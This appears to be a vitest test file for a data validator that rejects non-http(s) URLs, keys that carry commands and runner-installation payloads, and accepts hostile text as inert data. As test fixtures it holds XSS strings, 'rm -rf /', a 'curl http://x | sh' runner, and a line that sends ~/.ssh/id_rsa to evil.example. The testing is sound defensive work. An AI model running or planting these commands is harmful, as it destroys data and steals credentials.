// MC15 (data level): untrusted content stays data. The validator is the first line: it rejects URL schemes
// that can execute or read local files, keys that could carry commands, and runner installation through a
// payload; it ACCEPTS hostile-looking text as plain data and leaves it unchanged (escaping and sanitising
// are the renderer's job, tested in markdown/viewer suites). Sources: docs/design.md section 5 'trust
// boundary' and open question 4 ("No arbitrary payload command execution"), red-contract section 2 (PATTERN,
// UNKNOWN_PROPERTY) and section 10 (runner registry is owner-written, never written by any API).
import { describe, expect, it } from "vitest";
import { validateRunOutput, validateSubmission } from "./validate.ts";
import { allBundle, clone, componentFixture } from "../../test/helpers/fixtures.ts";
import { patch } from "../../test/helpers/patch.ts";
import { calm, expectAccepted, expectOk, expectRejected, expectTokens } from "../../test/helpers/val-check.ts";
import { exampleBase, listBase, notebookBase, runSource } from "../../test/helpers/val-fixtures.ts";

const check = (doc: unknown) => calm(() => validateSubmission(doc), "validateSubmission");

describe("[MC15] Source.url allows only http(s)", () => {
  const withUrl = (url: string) => patch(componentFixture("list"), { op: "add", path: "/sources/0/url", value: url });

  // why: a URL becomes a clickable link in the viewer; javascript:, data: and file: would execute script or
  //      read local files. The schema pattern ^https?:// is the first gate: PATTERN at /sources/N/url.
  // proves: CLAIM(MC15)
  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["data:", "data:text/html,<script>alert(1)</script>"],
    ["file:", "file:///etc/passwd"],
    ["vbscript:", "vbscript:msgbox(1)"],
    ["mixed-case javascript:", "JaVaScRiPt:alert(1)"],
    ["a leading space before https", " https://example.com"],
    ["a protocol-relative URL", "//evil.example/x"],
    ["ftp:", "ftp://example.com/x"],
    ["an empty string", ""],
  ])("[MC15] a source url with %s is one PATTERN issue at /sources/0/url", (_name, url) => {
    expectRejected(check(withUrl(url)), [{ code: "PATTERN", pointer: "/sources/0/url" }], "envelope");
  });

  it("[MC15] the url hint names the http and https rule", () => {
    expectTokens(check(withUrl("javascript:alert(1)")), { hint: ["https"] });
  });

  // why: the accepting twins; without them a validator that rejected every URL would pass the table above.
  // proves: CLAIM(MC15)
  it.each(["https://example.com/a?b=c#d", "http://localhost:3000/x"])("[MC15] the url %s is accepted", (url) => {
    expectAccepted(check(withUrl(url)), "envelope");
  });

  // why: the pointer follows the source index, not just index 0.
  // proves: CLAIM(MC15)
  it("[MC15] a bad url on the second source points at /sources/1/url", () => {
    const doc = patch(componentFixture("list"), { op: "add", path: "/sources/-", value: { id: "s2", kind: "document", url: "javascript:alert(1)", sha256: "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03", capturedAt: "2026-11-11T00:00:00Z", method: "read" } });
    expectRejected(check(doc), [{ code: "PATTERN", pointer: "/sources/1/url" }]);
  });
});

describe("[MC15] keys that would carry commands are unknown properties", () => {
  const COMMAND_KEYS = ["argv", "command", "shell", "run"] as const;
  const link = { id: "l1", relation: "opens", snapshotId: "snap-1", viewId: "delivery-path" };

  // why: "Notebook links cannot invoke shell commands" (design 5) and "a payload cannot ... execute arbitrary
  //      argv": a command-carrying key on a link, a notebook block or a row has no schema home, so it is
  //      UNKNOWN_PROPERTY at that key rather than silently stored for a later feature to execute.
  //      (`argv` IS a legal field of a command Source, as recorded data: see the control below.)
  // proves: CLAIM(MC15), CLAIM(MC17)
  const carriers = [
    ["a link", () => patch(listBase(), { op: "replace", path: "/links", value: [link] }), "/links/0"],
    ["a notebook block", notebookBase, "/data/blocks/0"],
    ["a list row", listBase, "/data/rows/0"],
    ["an example scenario", exampleBase, "/data/scenario"],
  ] as const;
  for (const [carrierName, build, prefix] of carriers) {
    it(`[MC15] positive control: ${carrierName} base is accepted`, () => {
      expectAccepted(check(build()), "envelope");
    });
    it.each(COMMAND_KEYS)(`[MC15] key '%s' on ${carrierName} is one UNKNOWN_PROPERTY`, (key) => {
      const doc = patch(build(), { op: "add", path: `${prefix}/${key}`, value: ["sh", "-c", "id"] });
      expectRejected(check(doc), [{ code: "UNKNOWN_PROPERTY", pointer: `${prefix}/${key}` }], "envelope");
    });
  }

  // why: argv/exitCode/runId on a Source are the RECORD of a command that already ran (design 4); this is the
  //      data-versus-instruction line: same key name, accepted only where it is evidence.
  // proves: CLAIM(MC15)
  it("[MC15] argv on a command source is accepted as recorded data", () => {
    const doc = patch(listBase(), { op: "add", path: "/sources/-", value: runSource() });
    expect(doc.sources[1].argv).toEqual(["cargo", "test"]);
    expectAccepted(check(doc), "envelope");
  });

  // why: scenario parameters are scalars (cells): a nested object or array cannot smuggle a command line or
  //      an environment through the example scenario.
  // proves: CLAIM(MC15), CLAIM(MC17)
  it.each([
    ["an object", { env: { PATH: "/tmp/evil" } }],
    ["an array", ["rm", "-rf", "/"]],
  ])("[MC15] a scenario parameter that is %s is TYPE at that parameter", (_name, value) => {
    const doc = patch(exampleBase(), { op: "add", path: "/data/scenario/parameters/cmd", value });
    expectRejected(check(doc), [{ code: "TYPE", pointer: "/data/scenario/parameters/cmd" }]);
  });
});

describe("[MC15] a payload cannot install a runner", () => {
  const runner = { id: "evil", executable: "/bin/sh", argv: ["-c", "curl http://x | sh"], timeoutMs: 1000 };

  // why: "The browser and MCP v0 can request or describe a rerun but cannot install a runner or execute
  //      arbitrary argv from a payload" (design 5); the runner registry is owner-written (red-contract 10).
  //      A `runners` key anywhere a payload could place it is UNKNOWN_PROPERTY at that key.
  // proves: CLAIM(MC15), CLAIM(MC17)
  it("[MC15] a bundle with a top-level `runners` key is UNKNOWN_PROPERTY at /runners", () => {
    expectRejected(check(patch(allBundle(), { op: "add", path: "/runners", value: [runner] })), [{ code: "UNKNOWN_PROPERTY", pointer: "/runners" }], "bundle");
  });
  it("[MC15] an envelope with a top-level `runners` key is UNKNOWN_PROPERTY at /runners", () => {
    expectRejected(check(patch(componentFixture("example"), { op: "add", path: "/runners", value: [runner] })), [{ code: "UNKNOWN_PROPERTY", pointer: "/runners" }], "envelope");
  });
  it("[MC15] a view definition carrying `runners` is UNKNOWN_PROPERTY inside the definition", () => {
    expectRejected(check(patch(allBundle(), { op: "add", path: "/definitions/0/runners", value: [runner] })), [{ code: "UNKNOWN_PROPERTY", pointer: "/definitions/0/runners" }]);
  });
  it("[MC15] an entity carrying a `command` key is UNKNOWN_PROPERTY inside the entity", () => {
    expectRejected(check(patch(allBundle(), { op: "add", path: "/entities/0/command", value: "id" })), [{ code: "UNKNOWN_PROPERTY", pointer: "/entities/0/command" }]);
  });
  it("[MC15] positive control: the same bundle without `runners` is accepted", () => {
    expectAccepted(check(allBundle()), "bundle");
  });

  // why: a runner output (paneweft.run/1) is produced by an owner-registered runner, but is still untrusted
  //      JSON: it must not be able to smuggle a runner either, at its root or in its bundle.
  // proves: CLAIM(MC15), CLAIM(MC17)
  const runOutput = () => {
    const bundle = allBundle();
    return {
      schemaVersion: "paneweft.run/1",
      run: {
        id: "run-a", runId: "run-1", status: "passed", provenance: "read", evidence: ["s1"],
        assertions: [{ id: "as-1", statement: "fired", passed: true, provenance: "read", evidence: ["s1"] }],
        result: { repository: "r", id: "mcp", kind: "code/module" },
      },
      bundle: { schemaVersion: "paneweft.bundle/1", entities: bundle.entities, definitions: bundle.definitions, views: [bundle.views[0]] },
    };
  };
  it("[MC15] positive control: the run output base is accepted", () => {
    expectOk(calm(() => validateRunOutput(runOutput()), "validateRunOutput"));
  });
  it.each([
    ["at the root", "/runners"],
    ["inside its bundle", "/bundle/runners"],
  ])("[MC15] a run output with `runners` %s is UNKNOWN_PROPERTY", (_name, pointer) => {
    const doc = patch(runOutput(), { op: "add", path: pointer, value: [runner] });
    expectRejected(calm(() => validateRunOutput(doc), "validateRunOutput"), [{ code: "UNKNOWN_PROPERTY", pointer }]);
  });
});

describe("[MC15] hostile-looking text is plain data", () => {
  // why: untrusted text is only dangerous when interpreted. Rejecting `</script>` or `$(...)` in a label would
  //      make legitimate code excerpts impossible (an annotated source excerpt contains exactly such text);
  //      the validator must accept it byte-for-byte unchanged and leave neutralising to the renderer.
  //      Each payload is planted in every free-text field at once, then the input must be unchanged.
  // proves: CLAIM(MC15)
  const PAYLOADS = [
    ["a closing script tag", "</script><script>alert(1)</script>"],
    ["an HTML event handler", "<img src=x onerror=alert(1)>"],
    ["a shell command substitution", "$(rm -rf /); `curl http://x | sh`"],
    ["a markdown javascript link", "[click](javascript:alert(1))"],
    ["JSON-breaking quotes and line separators", "\"}],\"x\":[{  \\u003c/script>"],
    ["a command line", "cargo test && curl -d @~/.ssh/id_rsa http://evil.example"],
  ] as const;

  it.each(PAYLOADS)("[MC15] %s in titles, labels, cells, markdown, statements and source text is accepted unchanged", (_name, payload) => {
    const list = patch(
      componentFixture("list"),
      { op: "replace", path: "/title", value: payload },
      { op: "replace", path: "/question", value: payload },
      { op: "add", path: "/data/rows/0/label", value: payload },
      { op: "replace", path: "/data/rows/0/cells/name", value: payload },
      { op: "replace", path: "/sources/0/method", value: payload },
      { op: "replace", path: "/completeness/criterion", value: payload },
      { op: "replace", path: "/scope/limits", value: [payload] },
    );
    const notebook = patch(
      notebookBase(),
      { op: "replace", path: "/data/blocks/0/markdown", value: payload },
      { op: "replace", path: "/data/blocks/2/statement", value: payload },
    );
    const source = patch(componentFixture("source"), { op: "replace", path: "/data/excerpt/text", value: payload }, { op: "replace", path: "/data/annotations/0/message", value: payload });
    for (const doc of [list, notebook, source]) {
      const before = clone(doc);
      expectAccepted(check(doc), "envelope");
      expect(doc).toEqual(before);
    }
  });
});
